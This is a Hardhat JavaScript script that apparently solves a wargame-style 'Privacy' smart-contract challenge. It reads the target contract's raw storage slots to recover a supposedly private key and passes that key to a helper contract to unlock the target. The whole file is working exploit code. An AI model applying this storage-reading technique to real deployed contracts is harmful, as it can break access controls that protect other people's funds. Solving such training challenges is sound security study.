const { ethers } = require("hardhat");
const { subtask } = require("hardhat/config");

async function main () {
    const useraddr = "0xdD2FD4581271e230360230F9337D5c0430Bf44C0";
    const instanceaddr = "0x8dAF17A20c9DBA35f005b6324F493785D239719d";
    const signer = await ethers.getSigner(useraddr);
    const contract = await ethers.getContractAt(
        "Privacy",
        instanceaddr,
        signer
    );
    const unlockcontract = await ethers.getContractFactory("_unlock");
    const deployunlock = await unlockcontract.deploy(instanceaddr);


    let recv = await ethers.provider.getStorage(instanceaddr, 0);
    console.log("slot 0", recv);
    recv = await ethers.provider.getStorage(instanceaddr, 1);
    console.log("slot 1", recv);
    recv = await ethers.provider.getStorage(instanceaddr, 2);
    console.log("slot 2", recv);
    recv = await ethers.provider.getStorage(instanceaddr, 3);
    console.log("slot 3", recv);
    recv = await ethers.provider.getStorage(instanceaddr, 4);
    console.log("slot 4", recv);
    recv = await ethers.provider.getStorage(instanceaddr, 5);
    console.log("slot 5(key)", recv);
    let key = recv;
    let unlock = await deployunlock.Unlock(key);
    unlock.wait();
    recv = await contract.locked();
    console.log(recv);
}

main().catch((error => {
    console.log(error);
    process.exit(1);
}))
